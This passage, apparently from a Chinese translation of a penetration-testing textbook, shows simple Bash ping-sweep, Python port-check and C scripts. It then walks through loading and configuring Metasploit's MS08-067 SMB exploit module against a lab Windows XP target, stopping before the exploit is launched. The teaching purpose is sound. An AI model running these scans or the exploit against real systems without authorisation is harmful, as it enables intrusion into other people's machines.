  \ `Kali Linux` 来运行你的攻击，而你的目标系统之一是 `Ubuntu Linux`，因此掌握这些基础将使学习渗透测试变得更加自然。\n\n## 第\
  \ 3 章 编程\n\n在本章中，我们将查看一些计算机编程的基本示例。我们将学习如何使用多种编程语言编写程序来自动化各种实用的任务。尽管本书的大部分内容使用了预构建的软件，但能够创建自己的程序是非常有用的。\n\
  \n## Bash 脚本\n\n在本节中，我们将查看如何使用 Bash 脚本同时运行多个命令。`Bash 脚本`（或 `shell 脚本`）是包含多个待运行终端命令的文件。任何我们可以在终端中运行的命令，都可以在脚本中运行。\n\
  \n### Ping\n\n我们将第一个脚本命名为 `pingscript.sh`。当它运行时运行时，该脚本将对我们的本地网络进行 `ping sweep`（ping\
  \ 扫描），向远程系统发送 Internet 控制消息协议（ICMP）消息，以查看它们是否有响应。\n\n我们将使用 `ping` 工具来确定网络上哪些主机是可达的。（尽管某些主机可能不响应\
  \ `ping` 请求，并且尽管无法“ping 通”但可能仍然在线，但 `ping sweep` 仍然是一个很好的起点。）默认情况下，我们向 `ping` 提供\
  \ IP 地址或主机名。例如，要 `ping` 我们的 Windows XP 目标，请输入示例 3-1 中的粗体代码。\n\n示例 3-1. Ping 远程主机\n\
  \n```\nroot@kali:~/# ping 192.168.20.10\nPING 192.168.20.10 (192.168.20.10) 56(84)\
  \ bytes of data.\n64 bytes from 192.168.20.10: icmp_req=1 ttl=64 time=0.090 ms\n\
  64 bytes from 192.168.20.10: icmp_req=2 ttl=64 time=0.029 ms\n64 bytes from 192.168.20.10:\
  \ icmp_req=3 ttl=64 time=0.038 ms\n64 bytes from 192.168.20.10: icmp_req=4 ttl=64\
  \ time=0.050 ms\n^C\n--- 192.168.20.10 ping statistics ---\n4 packets transmitted,\
  \ 4 received, 0% packet loss, time 2999 ms\nrtt min/avg/max/mdev = 0.029/0.051/0.090/0.024\
  \ ms\n```\n\n我们可以从 ping 的输出中判断出 Windows XP 目标在线并对 ping 探测的，因为我们收到了 ICMP 请求的响应。（ping\
  \ 的问题在于，除非你用 `ctrl-C` 停止它，否则它会一直运行下去。）\n\n### 简单的 Bash 脚本\n\n让我们开始编写一个简单的 Bash 脚本来\
  \ ping 网络上的主机。很好的起点是添加一些帮助信息，告诉用户如何正确运行你的脚本。\n\n```\n#!/bin/bash\necho \"Usage:\
  \ ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\n```\n\
  \n此脚本的第一行告诉终端使用 Bash 解释器。接下来的两行以 `echo` 开头，告诉用户我们的 ping 脚本将接受一个命令行参数（network），告诉脚本要对哪个网络进行\
  \ ping 扫描（例如 192.168.20）。`echo` 命令将简单打印引号中的文本。\n\n### 注意\n\n此脚本意味着我们正在处理一个 C 类网络，其中\
  \ IP 地址的前三个八字节组成了网络。\n\n创建脚本后，使用 `chmod` 使其具有执行权限，这样我们就可以运行它。\n\n```\nroot@kali:~/#\
  \ chmod 744 pingscript.sh\n```\n\n### 运行我们的脚本\n\n之前，在输入 Linux 命令时，我们在提示符处输入了命令名称。Linux\
  \ 内置命令以及添加到 Kali Linux 的渗透测试工具的文件系统位置，都是我们 `PATH` 环境变量的一部分。`PATH` 变量告诉 Linux 在哪些目录中搜索可执行文件。\n\
  \n```\nroot@kali:~/# echo $PATH\n```\n\n输出可能看起来所示：\n\n`/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/sbin:/bin`\n\
  \n注意输出中的 `/bin` 和 `/sbin` 被列出了。这些是 Linux 查找可执行文件的目录。如果我们运行一个不在任何这些目录中的命令，shell 将返回“command\
  \ not found”的错误。\n\n```\nroot@kali:~/# nonexistentcommand\nbash: nonexistentcommand:\
  \ not found\n```\n\n### 使用 if 语句添加功能\n\n现在，让我们用 `if` 语句添加更多功能，如示例 3-2 所示。\n\n`if`\
  \ 语句在许多编程语言中可用，尽管语法随语言而异。在 Bash 脚本中，`if` 语句的用法如下：`if [condition]`，其中 `condition`\
  \ 是必须满足的条件。\n\n在我们的脚本中，我们首先检查第一个命令行参数是否为空。符号 `$1` 代表 Bash 脚本中的第一个命令行参数，双等号 (`==`)\
  \ 用于检查相等。\n\n当我们无带命令行参数运行新脚本时，`if` 语句判断为真，因为第一个命令行参数确实为空，如下所示。\n\n```\nroot@kali:~/#\
  \ ./pingscript.sh\nUsage: ./pingscript.sh [network]\nexample: ./pingscript.sh 192.168.20\n\
  ```\n\n正如预期的那样，我们在屏幕上看到了用法信息。\n\n示例 3-2. 添加 if 语句\n\n```bash\n#!/bin/bash\nif [\
  \ \"$1\" == \"\" ]\nthen\necho \"Usage: ./pingscript.sh [network]\"\necho \"example:\
  \ ./pingscript.sh 192.168.20\"\nfi\n```\n\n### for 循环\n\n如果我们再次带命令行参数运行脚本，什么都不会发生。现在，让我们添加当用户使用正确参数运行脚本时触发的功能，如示例\
  \ 3-3 所示。\n\n示例 3-3. 添加 for 循环\n\n```bash\n#!/bin/bash\nif [ \"$1\" == \"\" ]\n\
  then\necho \"Usage: ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh\
  \ 192.168.20\"\nelse\nfor x in `seq 1 254`; do\nping -c 1 $1.$x\ndone\nfi\n```\n\
  \n\n\n\n\n在我们的 `then` 语句之后，我们使用一个 `else` 语句 ❶ 来指示脚本在 `if` 语句求值为假时运行代码——在这种情况下，即当用户提供了命令行参数时。由于我们希望此脚本\
  \ ping 本地网络上所有可能的主机，我们需要遍历 1 到 254 的数字（IP 版本 4 地址最后一个字节的可能值），并对这些每种情况运行 `ping` 命令。\n\
  \n运行顺序可能性的理想方法是使用 `for` 循环 ❷。我们的 `for` 循环 ``for x in \\`seq 1 254`; do`` 告诉脚本对从\
  \ 1 到 254 的每一个数字运行后续代码。这允许我们运行 254 次同一组指令，而不是为每个实例编写代码。我们用 `done` 指令 ❸ 来标记 `for`\
  \ 循环的结束。\n\n在 `for` 循环内部，我们想要 ping 网络中的每个 IP 地址。通过查阅 `ping` 的 man 页面（帮助文档），我们发现\
  \ `-c` 选项允许我们限制 ping 主机的次数。我们将 `-c` 设置为 `1`，这样每个主机只会被 ping 一次。\n\n为了指定 ping 哪个主机，我们希望第一个命令行参数（表示前三个字节）与\
  \ `for` 循环的当前迭代拼接。使用的完整命令是 `ping -c 1 $1.$x`。请记住 `$1` 表示第一个命令行参数，而 `$x` 是 `for`\
  \ 循环的当前迭代。当我们的 `for` 循环第一次运行时，它将 ping `192.168.20.1`，然后是 `192.168.20.2`，一直持续到 `192.168.20.254`。在第\
  \ 254 次迭代后，我们的 `for` 循环结束。\n\n当我们使用 IP 地址的前三个字节作为命令行参数运行脚本时，脚本将 ping 网络中的每个 IP 地址，如示例\
  \ 3-4 所示。\n\n示例 3-4. 运行 ping 扫描脚本\n\n```\nroot@kali:~/# ./pingscript.sh 192.168.20\n\
  PING 192.168.20.1 (192.168.20.1) 56(84) bytes of data.\n64 bytes from 192.168.20.1:\
  \ icmp_req=1 ttl=255 time=8.31 ms ❶\n\n--- 192.168.20.1 ping statistics ---\n1 packets\
  \ transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 8.317/8.317/8.317/0.000\
  \ ms\nPING 192.168.20.2(192.168.20.2) 56(84) bytes of data.\n64 bytes from 192.168.20.2:\
  \ icmp_req=1 ttl=128 time=166 ms\n\n--- 192.168.20.2 ping statistics ---\n1 packets\
  \ transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 166.869/166.869/166.869/0.000\
  \ ms\nPING 192.168.20.3 (192.168.20.3) 56(84) bytes of data.\nFrom 192.168.20.13\
  \ icmp_seq=1 Destination Host Unreachable ❷\n\n--- 192.168.20.3 ping statistics\
  \ ---\n1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms\n\
  --snip--\n```\n\n你的结果将根据本地网络中的系统而异。根据此输出，我可以判断在我的网络中，主机 `192.168.20.1` 是在线的，我收到了\
  \ ICMP 回复 ❶。相反，主机 `192.168.20.3` 未在线，因此我收到了主机不可达的通知 ❷。\n\n### 精简结果\n\n打印到屏幕上的所有这些信息并不好看，任何使用我们脚本的人都需要通过筛选大量信息来确定网络中的哪些主机是在线的。让我们添加一些额外功能来精简结果。\n\
  \n在上一章中我们涵盖了 `grep`，它用于搜索并匹配特定模式。让我们使用 `grep` 来过滤脚本的输出，如示例 3-5 所示。\n\n示例 3-5. 使用\
  \ `grep` 过滤结果\n\n```bash\n#!/bin/bash\nif [ \"$1\" == \"\" ]\nthen\necho \"Usage:\
  \ ./pingscript.sh [network]\"\necho \"example: ./pingscript.sh 192.168.20\"\nelse\n\
  for x in `seq 1 254`; do\nping -c 1 $1.$x | grep \"64 bytes\" ❶\ndone\nfi\n```\n\
  \n在这里，我们寻找字符串 `64 bytes` 的所有实例 ❶，当在 ping 主机时收到 ICMP 回复，就会出现该字符串。如果我们带有此更改运行脚本，我们看到只有包含\
  \ `64 bytes` 文本的行被打印到屏幕上，如下：\n\n```\nroot@kali:~/# ./pingscript.sh 192.168.20\n\
  64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=4.86 ms\n64 bytes from 192.168.20.2:\
  \ icmp_req=1 ttl=128 time=68.4 ms\n64 bytes from 192.168.20.8: icmp_req=1 ttl=64\
  \ time=64 ms\n```\n\n\n\n\n\n保存文件后，在运行脚本之前，使用 `chmod` 使脚本具有可执行权限，如下：\n\n```\nroot@kali:~/mydirectory#\
  \ chmod 744 pythonscript.py\nroot@kali:~/mydirectory# ./pythonscript.py\nEnter the\
  \ ip: 192.168.20.10\nEnter the port: 80\n```\n\n当你运行脚本时，正如预期，会提示你输入 IP 地址和端口。\n\n\
  现在我们将添加一些功能，允许我们使用用户的输入连接到所选端口上的系统，以检查其是否开放（示例 3-8）。\n\n### 示例 3-8. 添加端口扫描功能\n\n\
  ```python\n#!/usr/bin/python\nimport socket ❶\nip = raw_input(\"Enter the ip: \"\
  )\nport = input(\"Enter the port: \")\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\
  \ ❷\nif s.connect_ex((ip, port)): ❸\n        print \"Port\", port, \"is closed\"\
  \ ❹\nelse: ❺\n        print \"Port\", port, \"is open\"\n```\n\n在 Python 中执行网络任务，可以使用命令\
  \ `import socket` ❶ 包含名为 `socket` 的库。`socket` 库负责设置网络套接字的底层工作。\n\n创建 TCP 网络套接字的语法为\
  \ `socket.socket(socket.AF_INET, socket.SOCK_STREAM)`。我们在 ❷ 处将一个变量赋值为该网络套接字。\n\n\
  ### 连接到端口\n\n在创建 socket 连接远程端口时，Python 提供的第一个可用候选是 socket 函数 `connect`。然而，对于我们的目的，相似函数\
  \ `connect_ex` 是一个更好的选择。根据 Python 文档，`connect_ex` 与 `connect` 相似，不同在于如果连接失败，它返回错误代码而不是抛出异常。如果连接成功，`connect_ex`\
  \ 将返回值 `0`。因为我们想知道函数是否能连接到端口，这个返回值非常适合输入到 `if` 语句中。\n\n### Python 中的 if 语句\n\n在\
  \ Python 中构建 `if` 语句时，我们输入 `if` `condition:`。在 Python 中，作为条件 `or` 循环一部分的语句通过缩进表示，而不是使用结束标记，正如我们在\
  \ Bash 脚本中所看到的那样我们可以通过命令 `if s.connect_ex((ip, port)):` ❸ 让我们的 `if` 语句评估 TCP 套接字连接用户定义的\
  \ IP 地址和端口的返回值。如果连接成功，`connect_ex` 将返回 `0`，`if` 语句将对其评估为假。如果连接失败，`connect_ex` 将返回一个正整数，即真。因此，如果我们的\
  \ `if` 语句评估为真，理所当然端口是关闭的，我们可以使用 Python 的 `print` 命令在 ❹ 向用户显示此结果。并且与 Bash 脚本示例一样，如果\
  \ `connect_ex` 在 ❺ 返回 `0`，我们可以使用 `else` 语句（Python 中的语法为 `else:`）来通知用户测试的端口是开放的。\n\
  \n现在，运行更新后的脚本来测试 Windows XP 目标主机上是否运行 TCP 端口 80，如下：\n\n```\nroot@kali:~/# ./pythonscript.py\n\
  Enter the ip: 192.168.20.10\nEnter the port: 80\nPort 80 is open\n```\n\n根据我们的脚本，端口\
  \ 80 是开放的。现在再次针对端口 81 运行脚本。\n\n```\nroot@kali:~/# ./pythonscript.py\nEnter the ip:\
  \ 192.168.20.10\nEnter the port: 81\nPort 81 is closed\n```\n\n这次，脚本报告端口 81 是关闭的。\n\
  \n### 注意\n\n我们将在 第 5 章 中查看开放端口的检查，并在学习漏洞开发时回到 Python 脚本编写。Kali Linux 还有用于 Perl 和\
  \ Ruby 语言的解释器。我们将在 第 19 章 中学习一点 Ruby。了解多种语言百无一害。如果你准备好接受挑战，看看能否用 Perl 和 Ruby 重建这个脚本。\n\
  \n## 编写和编译 C 程序\n\n是时候来看另一个简单的编程示例了，这次使用 C 语言。与 Bash 和 Python 等脚本语言不同，C 代码在运行之前必须编译并翻译成\
  \ CPU 可以理解的机器语言。\n\nKali Linux 包含了 GNU 编译器集合 (GCC)，它允许我们编译 C 代码以便在系统上运行。让我们创建一个简单的\
  \ C 程序，向命令行参数打印问候，如 示例 3-9 所示。\n\n```c\n#include <stdio.h> ❶\nint main(int argc,\
  \ char *argv[]) ❷\n{\n    if(argc < 2) ❸\n    {\n        printf(\"%s\\n\", \"Pass\
  \ your name as an argument\"); ❹\n        return 0; ❺\n    }\n    else\n    {\n\
  \                printf(\"Hello %s\\n\", argv[1]); ❻\n                return 0;\n\
  \    }\n}\n```\n\nC  的语法与 Python 和 Bash 有些不同。因为我们的代码将被编译，所以我们不需要在代码开头告诉终端使用哪个解释器。首先，与我们的\
  \ Python 示例一样，我们导入一个 C 库。在这种情况下，我们将导入 `stdio`（标准输入输出的缩写）库，它允许我们接受输入并将输出打印终端。在 C\
  \ 中，我们使用命令 `#include <stdio.h>` ❶ 导入 `stdio`。\n\n每个 C 程序都有一个名为 `main` 的函数 ❷，在程序启动时运行。我们的程序将接收一个命令行参数，因此我们将整数\
  \ `argc` 和字符数组 `argv` 传递给 `main`。`argc` 是参数计数，`argv` 是参数向量，包含了传递给程序的任何命令行参数。这是接受命令行参数的\
  \ C 程序的标准语法。（在 C 中，函数、循环等的开始和结束由大括号 `{}` 表示。）\n\n首先，我们的程序会检查是否存在命令行参数。`argc` 整数是参数数组的长度；如果它小于二（程序名本身和命令行参数），则没有给出命令行参数。我们可以使用\
  \ `if` 语句进行检查 ❸。\n\n`if` 的语法在 C 中也稍有不同。与我们的 Bash 脚本一样，如果没有给出命令行参数，我们可以用用法信息提示用户\
  \ ❹。`printf` 函数允许我们向终端写入输出。还要注意 C 中的语句以分号 (`;`) 结束。一旦完成程序，我们使用 `return` 语句 ❺ 结束\
  \ `main` 函数。如果提供了命令行参数，我们的 `else` 语句将指示程序打印问候 ❻。（务必使用大括号关闭所有的循环和 `main` 函数。）\n\n\
  在运行程序之前，我们需要使用 GCC 对其进行编译，如下。将程序保存为 `cprogram.c`。\n\n```\nroot@kali:~# gcc cprogram.c\
  \ -o cprogram\n```\n\n使用 `-o` 选项指定编译程序的名称并将 C 代码传递给 GCC。现在从当前目录运行程序。如果运行程序时不带参数，你应该看到这里的用法信息。\n\
  \n```\nroot@kali:~# ./cprogram\nPass your name as an argument\n```\n\n如果我们传递一个参数（在这种情况下是我们的名字），程序会告诉我们\
  \ hello。\n\n```\nroot@kali:~# ./cprogram georgia\nHello georgia\n```\n\n### 注意\n\
  \n我们将在 第 16 章 中查看另一个 C 编程示例，其中稍显粗糙的 C 代码会导致缓冲区溢出条件，我们将对其利用。\n\n## 总结\n\n在本章中，我们查看了三种不同语言的简单程序。我们学习了基础结构，例如将信息保存在变量中供以后使用。此外，我们学习了如何使用条件（如\
  \ `if` 语句）和迭代（如 `for` 循环），让程序根据提供的信息做出决策。尽管使用的语法随编程语言而异，但思想是相同的。\n\n\n\n\n在随后的章节中，我们将深入探讨渗透测试的各个阶段，在本章中，我们将直接进入主题，获得漏洞利用的实战经验。尽管信息收集和侦察阶段对渗透测试成功的意义往往比漏洞利用更大，但获取\
  \ Shell（到受攻击目标的远程连接）或欺骗用户在你的克隆网站上输入公司凭据要有趣得多。\n\n在本章中，我们将使用 `Metasploit Framework`，该工具已成为渗透测试员的事实标准。Metasploit\
  \ 于 2003 年首次发布，在安全社区中已处于崇地位。尽管 Metasploit 现在归安全公司 `Rapid7` 所有，但仍提供开源版本，其开发很大程度上由安全社区驱动。\n\
  \nMetasploit 模块化且灵活的架构有助于开发者在发现新漏洞时高效地创建利用程序。正如你所看到的，Metasploit 直观且易用，它提供了一种集中化的方式来运行经过安全社区准确性验证的可靠漏洞利用代码。\n\
  \n为什么要使用 Metasploit？假设你在客户环境中发现了一个漏洞——`192.168.20.10` 上的 Windows XP 系统缺少微软安全更新公告\
  \ `MS08-067`。作为渗透测试员，你的职责是在可能的情况下利用该漏洞，并评估受攻击的风险。\n\n一种方法是在你的实验室中建立一个缺少此补丁的 Windows\
  \ XP 系统，尝试触发漏洞并开发一个可用的利用程序。但手动开发利用程序既需要时间又需要技能，而且你渗透测试的机会窗口可能正在关闭。\n\n相反，你可以在互联网上搜索利用该漏洞的代码。像\
  \ `Packet Storm Security` ([`www.packetstormsecurity.com/`](http://www.packetstormsecurity.com/))、`SecurityFocus`\
  \ ([`www.securityfocus.com/`](http://www.securityfocus.com/)) 和 `Exploit Database`\
  \ ([`www.exploit-db.com/`](http://www.exploit-db.com/)) 等网站提供了已知利用代码的库。但请预警：并非所有的公开利用代码都如其声称的那样。某些利用代码可能会破坏目标系统，甚至攻击你的系统而不是目标系统。在运行从网上找到任何内容时，你应该始终保持警惕，并在信任它之前仔细阅读代码。此外，你找到的公开利用程序可能无法直接满足你的需求。你可能需要一些额外工作将它们迁移到你的渗透测试环境中。\n\
  \n无论我们是从零开始开发利用程序还是使用公开的作为基础，我们仍然需要让该利用程序在你的渗透测试中运行。我们的时间可能会花在难以自动化的任务上，幸运的是，我们可以使用\
  \ Metasploit 让利用 `MS08-067` 等已知漏洞变得快速且轻松。\n\n## 开始 Metasploit\n\n让我们启动 Metasploit\
  \ 并攻击我们的第一个系统。在 Kali Linux 中，Metasploit 在我们的路径中，因此我们可以在系统的任何地方启动它。但在启动 Metasploit\
  \ 之前，你将启动 `PostgreSQL` 数据库，Metasploit 将使用它来跟踪你的操作。\n\n```\nroot@kali:~# service\
  \ postgresql start\n```\n\n现在你可以准备启动 Metasploit 服务了。此命令创建一个名为 `msf3` 的 `PostgreSQL`\
  \ 用户和一个相应的数据库来存储我们的数据。它还启动了 Metasploit 的远程过程调用 (RPC) 服务器和 Web 服务器。\n\n```\nroot@kali:~#\
  \ service metasploit start\n```\n\n使用 Metasploit 有多种接口。在本章中，我们将使用 `Msfconsole`（Metasploit\
  \ 文本控制台）和 `Msfcli`（命令行界面）。任何接口都可以用于运行 Metasploit 模块，尽管我倾向于大部分时间都留在 `Msfconsole`\
  \ 中。输入 `msfconsole` 启动控制台。\n\n```\nroot@kali:~# msfconsole\n```\n\n如果 `Msfconsole`\
  \ 看起来挂起了一两分钟，不要报警；它正在动态加载 Metasploit 模块树。一旦完成，你将看到一些巧妙的 ASCII 艺术、版本列表和其他细节以及 `msf\
  \ >` 提示符。\n\n示例 4-1. 启动 Msfconsole\n\n```\n ,           ,\n    /             \\\n\
  \   ((__---,,,---__))\n      (_) O O (_)_________\n         \\ _ /            |\\\
  \n          o_o \\   M S F   | \\\n               \\   _____  |  *\n           \
  \     |||   WW|||\n                |||     |||\n\nLarge pentest? List, sort, group,\
  \ tag and search your hosts and services\nin Metasploit Pro -- type 'go_pro' to\
  \ launch it now.\n\n       =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]\n\
  + -- --=[ 1246 exploits - 678 auxiliary - 198 post\n+ -- --=[ 324 payloads - 32\
  \ encoders - 8 nops\n\nmsf >\n```\n\n注意示例 4-1，截至本文编写时，Metasploit 拥有 1246 个利用程序、678\
  \ 个辅助模块等。如果你在使用 `Msfconsole` 时遇到困难，可以输入 `help` 获取命令列表及其功能描述。关于特定命令的更多详细信息，请输入 `help\
  \ <command name>`。\n\n例如，Metasploit 的 `route` 命令的帮助信息在示例 4-2 所示。\n\n示例 4-2. Metasploit\
  \ 中的帮助信息\n\n```\nmsf > help route\nUsage: route [add/remove/get/flush/print] subnet\
  \ netmask [comm/sid]\n\nRoute traffic destined to a given subnet through a supplied\
  \ session.\nThe default comm is Local\n```\n\n## 寻找 Metasploit 模块\n\n让我们看看可能如何使用\
  \ Metasploit 利用一个未修补的漏洞。我们将利用在 `MS08-067` 中修复的漏洞。你可能有一个自然的问题是，我们如何知道目标上缺少这个补丁？在随后的章节中，我们将演示在目标系统中发现此漏洞以及其他漏洞的步骤。现在，请相信我，这就是我们想要利用的漏洞。\n\
  \nMS08-067 修复了 `netapi32.dll` 中的一个问题，该问题允许攻击者通过服务器消息块 (SMB) 服务使用特殊构造的远程过程调用请求来接管目标系统。该漏洞特别危险，因为它不需要攻击者在运行攻击之前对目标机器进行身份验证。MS08-067\
  \ 因被 Conficker 蠕虫利用而臭名昭彰，该事件在媒体中被广泛报道。\n\n\n\n\n你可以使用 Metasploit 搜索页面，根据常见漏洞与披露\
  \ (CVE) 编号、开源漏洞数据库 (OSVDB) ID、Bugtraq ID 或微软安全公告来匹配 Metasploit 模块与**漏洞**，或者你也可以通过字符串对模块信息的全文进行搜索。在“微软安全公告\
  \ ID”字段中搜索 `MS08-067`，如图 4-1 所示。\n\n![Searching the Metasploit Auxiliary Module\
  \ & Exploit Database](img/httpatomoreillycomsourcenostarchimages2030302.png.jpg)图\
  \ 4-1. 搜索 Metasploit 辅助模块与漏洞数据库\n\n搜索结果如图图 4-2 所示，它告诉了我们需要的模块名称以及关于模块的信息（我们将在下一节中讨论）。\n\
  \n![MS08-067 Metasploit module page](img/httpatomoreillycomsourcenostarchimages2030304.png.jpg)图\
  \ 4-2. MS08-067 Metasploit 模块页面\n\n针对 MS08-067 安全公告的 Metasploit 模块全名显示在 URI 栏中。在\
  \ Metasploit 的模块目录下，该漏洞是 `exploit/windows/smb/ms08_067_netapi`。\n\n### 内置搜索\n\n\
  你也可以使用 Metasploit 的内置搜索功能来查找正确的模块名称，如示例 4-3 所示。\n\n示例 4-3. 搜索 Metasploit 模块\n\n\
  ```\nmsf > search ms08-067\n\nMatching Modules\n================\n\n   Name    \
  \                             Disclosure Date          Rank   Description\n   ----\
  \                                 ---------------          ----   -----------\n\
  \   exploit/windows/smb/ms08_067_netapi  2008-10-28 00:00:00 UTC  great  Microsoft\
  \ Server\n                                                                     \
  \     Service Relative Path\n                                                  \
  \                        Stack Corruption\n```\n\n我们再次发现该漏洞的正确模块名称是 `exploit/windows/smb/ms08_067_netapi`。一旦确定了要使用的模块，就带有模块名输入\
  \ `info` 命令，如示例 4-4 所示。\n\n示例 4-4. Metasploit 中的信息列表\n\n```\n msf > info exploit/windows/smb/ms08_067_netapi\n\
  \n        ❶Name: Microsoft Server Service Relative Path Stack Corruption\n     \
  \ ❷Module: exploit/windows/smb/ms08_067_netapi\n      Version: 0\n    ❸Platform:\
  \ Windows\n  ❹Privileged: Yes\n      License: Metasploit Framework License (BSD)\n\
  \        ❺Rank: Great\n\n❻ Available targets:\n    Id  Name\n    --  ----\n    0\
  \   Automatic Targeting\n    1   Windows 2000 Universal\n    2   Windows XP SP0/SP1\
  \ Universal\n    --snip--\n    67  Windows 2003 SP2 Spanish (NX)\n\n  ❼ Basic options:\n\
  \    Name     Current Setting  Required  Description\n    ----     ---------------\
  \  --------  -----------\n    RHOST                     yes       The target address\n\
  \    RPORT    445              yes       Set the SMB service port\n    SMBPIPE \
  \ BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\n❽ Payload\
  \ information:\n    Space: 400\n    Avoid: 8 characters\n❾ Description:\n    This\
  \ module exploits a parsing flaw in the path canonicalization\n    code of NetAPI32.dll\
  \ through the Server Service. This module is\n    capable of bypassing NX on some\
  \ operating systems and service packs.\n    The correct target must be used to prevent\
  \ the Server Service (along\n    with a dozen others in the same process) from crashing.\
  \ Windows XP\n    targets seem to handle multiple successful exploitation events,\
  \ but\n    2003 targets will often crash or hang on subsequent attempts. This\n\
  \    is just the first version of this module, full support for NX bypass\n    on\
  \ 2003, along with other platforms, is still in development.\n❿ References:\n  \
  \  http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx\n```\n\n此信息页告诉我们很多信息。\n\
  \n*   首先我们看到关于模块的一些基本信息，包括 ❶ 处的描述性名称，随后是 ❷ 处的模块名称。（版本字段以前表示模块的 SVN 修订版本，但现在 Metasploit\
  \ 托管在 GitHub 上，所有模块的版本都设置为 0。）\n\n*   `Platform` ❸ 告诉我们该漏洞是针对 Windows 系统的。\n\n*\
  \   `Privileged` ❹ 告诉我们该模块是否需要或在目标上授予高权限。`License` 设置为 Metasploit Framework License\
  \ (BSD)。（Metasploit 的许可证是三条款 BSD 开源许可证。）\n\n*   `Rank` ❺ 列出了漏洞对目标的潜在影响。漏洞从手动到优秀进行排名。评级为优秀的漏洞绝不会导致服务崩溃；像\
  \ MS08-067 这样的内存损坏漏洞通常不属于此类。我们的模块属于 `great`（优秀）类别，低一级。一个优秀的漏洞可以自动检测正确目标，并具有其他可能增加成功率的功能。\n\
  \n*   `Available targets` ❻ 列出了该模块可以利用的操作系统版本和补丁级别。该模块可以利用 Windows 2000、Windows\
  \ 2003 以及 Windows XP 等服务包。\n\n*   `Basic options` ❼ 列出了可以设置以满足我们需求的模块选项。例如，`RHOST`\
  \ 选项告诉 Metasploit 目标地址。（我们将在设置选项 中讨论基本选项。）\n\n*   `Payload information` ❽ 包含了帮助\
  \ Metasploit 决定在使用该漏洞时哪些 payload。payload（或 shellcode）告诉被攻击系统代表攻击者做什么。（攻击的目标显然是让它做不该做的事。）Metasploit\
  \ 的 payload 系统为让目标做什么提供了很多选择。\n\n*   `Description` ❾ 包含了关于特定漏洞的更多详细信息。\n\n*   `References`\
  \ ❿ 包含了在线数据库条目。如果你不确定某个漏洞应该使用哪个 Metasploit 模块，请从它的信息页开始。\n\n确认模块正确后，使用命令 `use windows/smb/ms08_067_netapi`\
  \ 告诉 Metasploit 使用该模块。你可以省略漏洞名称 `exploit/` 部分；Metasploit 会明白你想做什么。\n\n```\nmsf >\
  \ use windows/smb/ms08_067_netapi\nmsf  exploit(ms08_067_netapi) >\n```\n\n现在我们处于漏洞模块的上下文中。\n\
  \n### 设置模块选项\n\n选择了漏洞后，我们需要为 Metasploit 提供一些信息。正如你在本书中所看到的，Metasploit 可以在渗透测试的许多方面提供帮助，但它还不是读心者……目前。要查看\
  \ Metasploit 运行所选模块所需的信息，输入 `show options`（示例 4-5）。\n\n示例 4-5. 漏洞模块选项\n\n```\nmsf\
  \  exploit(ms08_067_netapi) > show options\n\nModule options (exploit/windows/smb/ms08_067_netapi):\n\
  \n   Name     Current Setting  Required  Description\n   ----     ---------------\
  \  --------  -----------\n  ❶RHOST                     yes       The target address\n\
  \  ❷RPORT    445              yes       Set the SMB service port\n  ❸SMBPIPE  BROWSER\
  \          yes       The pipe name to use (BROWSER, SRVSVC)\n\nExploit target:\n\
  \n   Id  Name\n   --  ----\n  ❹0   Automatic Targeting\n\nmsf  exploit(ms08_067_netapi)\
  \ >\n```\n\n\n\n\n在示例 4-5 所示的输出顶部，是模块设置以及任何默认值，包括某些设置是否是模块成功运行所需的，以及每个设置的描述。\n\n\
  ### RHOST\n\n`RHOST` 选项 ❶ 指的是我们想要利用的远程主机。该选项是必须的，因为它为 Metasploit 提供了攻击目标。我们将通过将\
  \ `RHOST` 选项从空白更改为目标 IP 地址，告诉 Metasploit 去攻击我们在第 1 章中设置的 Windows XP 目标机器。（如果你忘了那是什么了，可以在\
  \ Windows XP 机器的命令行中运行 `ipconfig` 来查找。）要设置选项，输入 `set` `<要设置的选项> <要设置的值>`，在此情况下，即为\
  \ `set RHOST 192.168.20.10`。（记住使用你自己的 Windows XP 目标机的 IP 地址。）执行此命令后，再次运行 `show options`\
  \ 应该会显示 `RHOST` 的值已设置为 192.168.20.10。\n\n### RPORT\n\n`RPORT` ❷ 指的是要攻击的远程端口。我记得我的一位前经理花了很多时间寻找\
  \ 80 端口——即试图在物理上找到它。对我关于网络套接字完全由代码组成的解释感到不满意，我最终直接指向了以太网口。这个故事的教训是：端口只是一个网络套接字；它不是物理端口。例如，当你访问\
  \ [www.google.com](http://www.google.com) 时，互联网上的某个 Web 服务器正在监听端口 80。\n\n在这种情况下，我们看到\
  \ `RPORT` 被设置了一个默认值。由于我们的攻击利用使用了 Windows SMB 服务，`RPORT` 的值可能是 445，这是 SMB 的默认端口。而且，如你所见，Metasploit\
  \ 通过将默认值设置为 445 为我们省去了设置该值的麻烦（如果你需要，可以更改它）。在我们的案例中，可以置不管它。\n\n### SMBPIPE\n\n与 `RPORT`\
  \ 值一样，将 `SMBPIPE` 选项 ❸ 的默认值保持为 `BROWSER`。这对于我们的目的来说完全足够。（SMB 管道允许我们通过网络与 Windows\
  \ 进程间通信。我们将在本章晚些时候查看查找目标机器上有哪些 SMB 管道正在监听。）\n\n### 攻击目标 (Exploit Target)\n\n攻击目标被设置为\
  \ `0 Automatic Targeting` ❹。这是目标操作系统和版本。你可以在模块的信息页上查看可用目标，或者直接使用命令 `show targets`\
  \ 显示出它们（示例 4-6）。\n\n示例 4-6. 攻击目标\n\n```\nmsf  exploit(ms08_067_netapi) > show targets\n\
  \nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n   1\
  \   Windows 2000 Universal\n   2   Windows XP SP0/SP1 Universal\n   3   Windows\
  \ XP SP2 English (AlwaysOn NX)\n   4   Windows XP SP2 English (NX)\n   5   Windows\
  \ XP SP3 English (AlwaysOn NX)\n   --snip--\n   67  Windows 2003 SP2 Spanish (NX)\n\
  ```\n\n如你在示例 4-6 中所示，该模块可以攻击 Windows 2000、Windows 2003 和 Windows XP。\n\n### 注意\n\
